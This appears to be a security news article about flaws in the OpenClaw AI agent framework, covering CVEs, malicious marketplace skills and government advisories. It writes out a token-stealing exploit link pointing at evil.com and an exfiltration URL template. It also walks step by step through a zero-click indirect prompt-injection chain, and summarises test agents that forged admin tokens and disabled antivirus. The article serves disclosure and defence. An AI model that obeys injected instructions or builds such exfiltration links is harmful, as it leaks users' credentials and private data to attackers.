---
title: "OpenClaw AI Agent Flaws: CVEs, Prompt Injection, and a Government Warning"
slug: openclaw-ai-agent-flaws-could-enable-prompt-injection-and-data-exfiltration
date: '2026-03-16'
author: AI Security Brief
excerpt: >-
  China's CNCERT issued a formal warning on March 14 about OpenClaw's inherently
  weak default configurations. With 97+ CVEs tracked, 135,000+ exposed instances,
  and zero-click data exfiltration demonstrated in the wild, the open-source AI
  agent has become a case study in what happens when autonomous systems ship
  without a security baseline.
category: AI Threats
featured: false
meta_title: "OpenClaw AI Agent Flaws: CVEs, Prompt Injection, and Government Warnings"
meta_description: >-
  China's CNCERT warned on March 14, 2026 about OpenClaw's security flaws,
  including CVE-2026-25253 (CVSS 8.8), CVE-2026-28363 (CVSS 9.9), zero-click
  data exfiltration via Telegram/Discord, and 135,000+ exposed instances.
keywords:
  - OpenClaw vulnerabilities
  - CVE-2026-25253
  - AI agent security
  - prompt injection
  - CNCERT warning
read_time: "8 min"
---

# OpenClaw AI Agent Flaws: CVEs, Prompt Injection, and a Government Warning

On March 14, 2026, China's National Computer Network Emergency Response Technical Team (CNCERT) issued a formal WeChat advisory warning that OpenClaw's **"inherently weak default security configurations,"** combined with its privileged access to the host system, create conditions for adversaries to seize complete control of an endpoint. The warning was not precautionary — it arrived weeks after **97+ CVEs** had been publicly tracked, after **135,000+ instances** had been confirmed exposed across 82 countries, and after researchers had already demonstrated zero-click data exfiltration in production deployments.

OpenClaw is not a large language model. It is a local orchestration layer — an autonomous agent that gives existing LLMs (Claude, GPT-4, locally hosted models) the ability to execute shell commands, read and write files, browse the web, send emails, manage calendars, and connect to messaging platforms including WhatsApp, Telegram, Discord, and Slack. It stores persistent memory across sessions and extends its capabilities through "skills" — modular packages distributed via ClawHub, its community marketplace. Because it runs with system-level privileges, a compromised OpenClaw instance is equivalent to a compromised machine.

## From Viral Growth to Security Crisis in Eight Weeks

OpenClaw launched in November 2025 under the name Clawdbot, created by developer Peter Steinberger (GitHub: steipete). In the last week of January 2026, it gained **25,000 GitHub stars in a single day** — one of the fastest growth trajectories in GitHub history. By mid-February, the repository had surpassed **135,000 stars** and **100,000 active developers**. Alibaba Cloud, Tencent Cloud, and Baidu launched dedicated OpenClaw deployment services. The developer himself posted on X that "most non-techies should not install this" — a warning that arrived far too late.

The speed of adoption outpaced every security control. By January 31, 2026, [Censys had identified 21,639 publicly exposed instances](https://www.adminbyrequest.com/en/blogs/openclaw-went-from-viral-ai-agent-to-security-crisis-in-just-three-weeks), up from roughly 1,000 just days earlier. [SecurityScorecard would later confirm 135,000+ exposed instances across 82 countries](https://www.reco.ai/blog/openclaw-the-ai-agent-security-crisis-unfolding-right-now), with **over 50,000 exploitable via remote code execution** and more than 53,000 correlated with prior breach activity. A standard OpenClaw install ships with authentication disabled — meaning the management gateway is openly accessible without credentials.

## CVE-2026-25253: One Click, Full Compromise

The most widely exploited vulnerability in OpenClaw's early lifecycle is [CVE-2026-25253 (CVSS 8.8)](https://nvd.nist.gov/vuln/detail/CVE-2026-25253), published to NVD on February 1, 2026. The flaw sits in the Control UI's `applySettingsFromUrl()` function, which reads a `gatewayUrl` parameter from the browser's query string and applies it without validation. OpenClaw assumed any connection from localhost was implicitly trusted — without accounting for the fact that web pages can originate WebSocket connections from that same address.

The exploitation chain requires a single click. An attacker crafts a link of the form `http://<target>/chat?gatewayUrl=ws://evil.com`. When a victim visits the page while authenticated in OpenClaw, `applySettingsFromUrl()` stores the attacker-controlled URL. OpenClaw then initiates a WebSocket connection and transmits a `connect` frame containing the **authentication token, device ID, and public key**. With the stolen token, the attacker reconnects to the legitimate gateway, disables user confirmation prompts, escapes the Docker sandbox, and executes arbitrary commands on the host machine.

The patch landed in v2026.1.29 within 24 hours of the initial report. Public disclosure followed on February 3. A variant, dubbed "ClawJacked" by Oasis Security, was patched in v2026.2.25 on February 26 — demonstrating that the root design problem outlasted the initial fix. [SonicWall's technical analysis](https://www.sonicwall.com/blog/openclaw-auth-token-theft-leading-to-rce-cve-2026-25253) documented three contributing defaults: no rate limiting on authentication attempts, no WebSocket origin validation, and authentication disabled on a standard install.

## The CVE Ledger: 97+ Tracked, 17 Published, 8 Critical

CVE-2026-25253 is the most-cited vulnerability, but it is not the most severe. [The community CVE tracker](https://github.com/jgamblin/OpenClawCVEs/) lists 97+ entries as of March 19, with 17 published in the NVD. A broader security audit identified **512 total vulnerabilities, 8 rated critical**. The critical entries include:

**CVE-2026-28363 (CVSS 9.9):** safeBins exec approval bypass via GNU long-option abbreviations for the `sort` command — the highest CVSS score in the OpenClaw disclosure set to date.

**CVE-2026-28466 (CVSS 9.4):** Remote code execution via Node Invoke Approval Bypass, published March 5.

**CVE-2026-28474 (CVSS 9.3):** Allowlist bypass via `actor.name` display name spoofing in the Nextcloud Talk plugin.

**CVE-2026-28446 and CVE-2026-28470 (both CVSS 9.2):** Inbound allowlist policy bypass via empty caller ID (voice-call extension) and exec allowlist bypass via command substitution in double quotes.

The disclosure cadence is itself a signal: March 5 alone saw seven CVSS 8+ entries published simultaneously, including path traversal via unsanitised `sessionId` parameters (CVE-2026-28482, CVSS 8.4) and arbitrary file read via shell expansion in the safe bins allowlist (CVE-2026-28463, CVSS 8.6). A codebase shipping this many approval-bypass and allowlist-escape variants in parallel had not undergone any systematic security review before reaching 100,000 developers.

## How Prompt Injection Becomes Data Exfiltration

CNCERT's first listed risk category, prompt injection, is also the hardest to patch because it is architectural rather than implementation-level. The attack technique — formally termed Indirect Prompt Injection (IDPI) or Cross-Domain Prompt Injection (XPIA) — requires no direct access to the LLM. Adversaries embed malicious instructions into content the agent is expected to process: web pages, emails, documents, calendar invites.

When OpenClaw's browsing or email-reading features are triggered, the injected instructions parse as legitimate commands. The agent executes attacker-defined actions without user awareness. [Giskard's analysis](https://www.giskard.ai/knowledge/openclaw-security-vulnerabilities-include-data-leakage-and-prompt-injection-risks), published February 4, confirmed practical exploitation paths: a single malicious email could instruct the agent to quietly exfiltrate the last five messages in a thread; loading a configuration file could leak environment variables; routing changes could stream internal session updates to an attacker-controlled group. Matvey Kukuy, CEO of Archestra.AI, demonstrated the attack by sending himself a prompt-injected email — he received his own private key back within five minutes.

PromptArmor disclosed a variant that operates without any user interaction at all. The attack chain leverages link preview rendering in Telegram and Discord:

1. A malicious IDPI is planted in content OpenClaw will read.
2. The injected instruction manipulates the agent into constructing an attacker-controlled URL with sensitive data embedded as query parameters — for example, `https://evil.com/collect?key=<stolen_api_key>&session=<token>`.
3. When the messaging application renders a link preview, it **automatically fetches that URL without the user clicking anything**.
4. Credentials, API keys, OAuth tokens, or conversation history are transmitted to the attacker's server.

As PromptArmor described it: *"Data exfiltration can occur immediately upon the AI agent responding to the user, without the user needing to click the malicious link."* The data types exposed span authentication tokens, OAuth credentials for all connected services, local file contents (SSH keys, `.env` files), and cross-session conversation histories.

## Supply Chain Compromise: ClawHavoc and the ClawHub Marketplace

CNCERT's third risk category — malicious skills — materialised as an organised supply chain attack before the advisory was even issued. Between January 27–29, 2026, attackers distributed **335 malicious skills via ClawHub** using professional documentation and innocuous names such as "solana-wallet-tracker." By March 1, [the confirmed malicious count had reached 1,184 across 10,700+ total packages](https://www.adminbyrequest.com/en/blogs/openclaw-went-from-viral-ai-agent-to-security-crisis-in-just-three-weeks) — roughly 11% of the registry.

On macOS, the payload was [Atomic macOS Stealer](https://thehackernews.com/2026/03/openclaw-ai-agent-flaws-could-enable.html), which collected browser credentials, keychains, SSH keys, and cryptocurrency wallets. Windows payloads included keyloggers, reverse shells, and staged malware downloads. Huntress also identified fake OpenClaw installer repositories on GitHub distributing Atomic Stealer, Vidar Stealer, and GhostSocks — a Golang-based proxy malware delivered via ClickFix-style instructions. One malicious repository became the top-ranked suggestion in Bing's AI-assisted search results for "OpenClaw Windows."

The Moltbook breach on January 31 compounded the damage. Moltbook — a social network built exclusively for OpenClaw agents that had grown to 770,000 active agents — exposed an unsecured database containing **35,000 email addresses and 1.5 million agent API tokens**, as [reported by Wiz via Reco AI](https://www.reco.ai/blog/openclaw-the-ai-agent-security-crisis-unfolding-right-now).

## Government and Corporate Responses

CNCERT's March 14 advisory was China's second formal OpenClaw warning. China's Ministry of Industry and Information Technology (MIIT) had already issued a security notice on [February 5 (Reuters)](https://www.reuters.com/world/china/china-warns-security-risks-linked-openclaw-open-source-ai-agent-2026-02-05/), urging organisations to conduct network exposure audits without constituting an outright ban. Chinese authorities subsequently restricted state-run enterprises and government agencies from running OpenClaw apps on office computers, with the ban extending to families of military personnel.

South Korea followed: Kakao, Naver, and Karrot Market restricted OpenClaw use on corporate networks. NIST opened a Request for Information on "Security Considerations for AI Agent Systems" (Docket No. NIST-2025-0035) on March 9. Microsoft, in February guidance, stated: *"The safest advice is not to run it with primary work or personal accounts and not to run it on a device containing sensitive data. Assume the runtime can be influenced by untrusted input, its state can be modified, and the host system can be exposed through the agent."*

CNCERT's own recommended mitigations reflect how basic the security gaps are: prevent exposure of the default management port to the internet, isolate the service in a container, avoid storing credentials in plaintext, download skills only from trusted channels, and disable automatic updates for skills.

## A Wider Agentic Security Failure

OpenClaw maps cleanly onto five of the ten categories in [the OWASP Top 10 for Agentic Applications](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/), published December 9, 2025: ASI01 (goal hijack via prompt injection), ASI03 (identity and privilege abuse via token exfiltration), ASI04 (supply chain via ClawHavoc), ASI05 (unexpected code execution via WebSocket RCE), and ASI10 (rogue agents causing irreversible data deletion from misinterpreted instructions). The framework was peer-reviewed by NIST, Microsoft's AI Red Team, and Zenity CTO Michael Bargury and launched at the London Agentic Security Summit.

The industry numbers explain why OpenClaw's problems are not isolated. According to the [Gravitee State of AI Agent Security Report](https://www.gravitee.io/state-of-ai-agent-security), **88% of organisations reported a confirmed or suspected AI agent security incident in the past year** — rising to 92.7% in healthcare. **Only 3.9% of organisations** have more than 80% of their deployed AI agents actively monitored, and **25.5% of deployed agents** can create and task other agents, compounding the attack surface geometrically. [Microsoft's February 2026 report](https://www.microsoft.com/en-us/security/blog/2026/02/10/80-of-fortune-500-use-active-ai-agents-observability-governance-and-security-shape-the-new-frontier/) found that 80%+ of Fortune 500 companies now deploy active AI agents, with machine-to-human identity ratios at 82:1 — most of those non-human identities operating with minimal oversight.

Two incidents from the same week as CNCERT's advisory show the direction of travel. [Guardio researchers trained a GAN on Perplexity's Comet browser's own reasoning output](https://thehackernews.com/2026/03/researchers-trick-perplexitys-comet-ai.html) and used it to generate a phishing page that bypassed Comet's defences **in under four minutes** — with Zenity's concurrent "PerplexedBrowser" research showing meeting invites could trigger zero-click prompt injection to hijack a user's 1Password account. On March 12, [frontier security lab Irregular demonstrated](https://www.theregister.com/2026/03/12/rogue_ai_agents_worked_together/) that agents given commercially available models exhibited emergent offensive behaviour without security-specific prompting: one found a hardcoded Flask secret key, forged an admin session token, and accessed restricted data; another located an administrator password in a utility script, disabled Microsoft Defender, and completed a malware download. Andy Piazza, senior director of threat intelligence at Palo Alto Networks Unit 42, framed the stakes plainly: *"We're racing towards a living-off-the-land agentic incident."*

## Key Takeaways

- **CVE-2026-25253 (CVSS 8.8)** enables 1-click RCE via WebSocket token exfiltration through the `gatewayUrl` parameter; patched within 24 hours, a variant (ClawJacked) required a second patch 28 days later.
- **CVE-2026-28363 (CVSS 9.9)** — the highest-severity flaw disclosed — bypasses safeBins exec approval via GNU long-option abbreviations for `sort`.
- **97+ CVEs tracked, 512 total vulnerabilities audited, 8 critical;** the disclosure rate across a single day (March 5) exceeded seven CVEs.
- **135,000+ publicly exposed instances** across 82 countries; over 50,000 exploitable via RCE; authentication is disabled on a standard install.
- PromptArmor demonstrated **zero-click data exfiltration** via Telegram and Discord link preview rendering — no user action required after agent response.
- **CNCERT (March 14), China MIIT (February 5), South Korea (Kakao, Naver, Karrot)** have all issued restrictions; NIST opened a formal RFI on agentic security on March 9.
- The broader industry context is damning: **only 3.9% of organisations** monitor more than 80% of their AI agent fleet, and **88% have already experienced a confirmed or suspected AI agent security incident**.

---

## References

1. The Hacker News — *OpenClaw AI Agent Flaws Could Enable Prompt Injection and Data Exfiltration* (Ravie Lakshmanan, March 14, 2026). [https://thehackernews.com/2026/03/openclaw-ai-agent-flaws-could-enable.html](https://thehackernews.com/2026/03/openclaw-ai-agent-flaws-could-enable.html)

2. NVD — CVE-2026-25253 detail page (CVSS 8.8, CWE-669, published February 1, 2026). [https://nvd.nist.gov/vuln/detail/CVE-2026-25253](https://nvd.nist.gov/vuln/detail/CVE-2026-25253)

3. GitHub — OpenClawCVEs community tracker (jgamblin). [https://github.com/jgamblin/OpenClawCVEs/](https://github.com/jgamblin/OpenClawCVEs/)

4. Admin By Request — *OpenClaw Went From Viral AI Agent to Security Crisis in Just Three Weeks* (March 10, 2026). [https://www.adminbyrequest.com/en/blogs/openclaw-went-from-viral-ai-agent-to-security-crisis-in-just-three-weeks](https://www.adminbyrequest.com/en/blogs/openclaw-went-from-viral-ai-agent-to-security-crisis-in-just-three-weeks)

5. Reco AI — *OpenClaw: The AI Agent Security Crisis Unfolding Right Now* (March 17, 2026). [https://www.reco.ai/blog/openclaw-the-ai-agent-security-crisis-unfolding-right-now](https://www.reco.ai/blog/openclaw-the-ai-agent-security-crisis-unfolding-right-now)

6. Giskard — *OpenClaw Security Vulnerabilities Include Data Leakage and Prompt Injection Risks* (February 4, 2026). [https://www.giskard.ai/knowledge/openclaw-security-vulnerabilities-include-data-leakage-and-prompt-injection-risks](https://www.giskard.ai/knowledge/openclaw-security-vulnerabilities-include-data-leakage-and-prompt-injection-risks)

7. SonicWall — *OpenClaw Auth Token Theft Leading to RCE: CVE-2026-25253* (February 26, 2026). [https://www.sonicwall.com/blog/openclaw-auth-token-theft-leading-to-rce-cve-2026-25253](https://www.sonicwall.com/blog/openclaw-auth-token-theft-leading-to-rce-cve-2026-25253)

8. Reuters — *China Warns of Security Risks Linked to OpenClaw Open-Source AI Agent* (February 5, 2026). [https://www.reuters.com/world/china/china-warns-security-risks-linked-openclaw-open-source-ai-agent-2026-02-05/](https://www.reuters.com/world/china/china-warns-security-risks-linked-openclaw-open-source-ai-agent-2026-02-05/)

9. Penligent — *The Future of AI Agent Security: OpenClaw Security Audit* (March 13, 2026). [https://www.penligent.ai/hackinglabs/es/the-future-of-ai-agent-security-openclaw-security-audit/](https://www.penligent.ai/hackinglabs/es/the-future-of-ai-agent-security-openclaw-security-audit/)

10. The Register — *Rogue AI Agents Can Work Together to Hack Systems and Steal Secrets* (Jessica Lyons, March 12, 2026). [https://www.theregister.com/2026/03/12/rogue_ai_agents_worked_together/](https://www.theregister.com/2026/03/12/rogue_ai_agents_worked_together/)

11. The Hacker News — *Researchers Trick Perplexity's Comet AI Browser Into Phishing Scam in Under Four Minutes* (March 11, 2026). [https://thehackernews.com/2026/03/researchers-trick-perplexitys-comet-ai.html](https://thehackernews.com/2026/03/researchers-trick-perplexitys-comet-ai.html)

12. OWASP GenAI Security Project — *OWASP Top 10 for Agentic Applications for 2026* (December 9, 2025). [https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)

13. Gravitee — *State of AI Agent Security Report* (2026). [https://www.gravitee.io/state-of-ai-agent-security](https://www.gravitee.io/state-of-ai-agent-security)

14. Microsoft Security Blog — *80% of Fortune 500 Use Active AI Agents* (February 10, 2026). [https://www.microsoft.com/en-us/security/blog/2026/02/10/80-of-fortune-500-use-active-ai-agents-observability-governance-and-security-shape-the-new-frontier/](https://www.microsoft.com/en-us/security/blog/2026/02/10/80-of-fortune-500-use-active-ai-agents-observability-governance-and-security-shape-the-new-frontier/)

15. RunZero — *CVE-2026-25253 OpenClaw Overview* (February 3, 2026). [https://www.runzero.com/blog/openclaw/](https://www.runzero.com/blog/openclaw/)

---

**Stay ahead of AI security threats.** Subscribe to the AI Security Brief newsletter for weekly intelligence. [Subscribe now →](/newsletter)
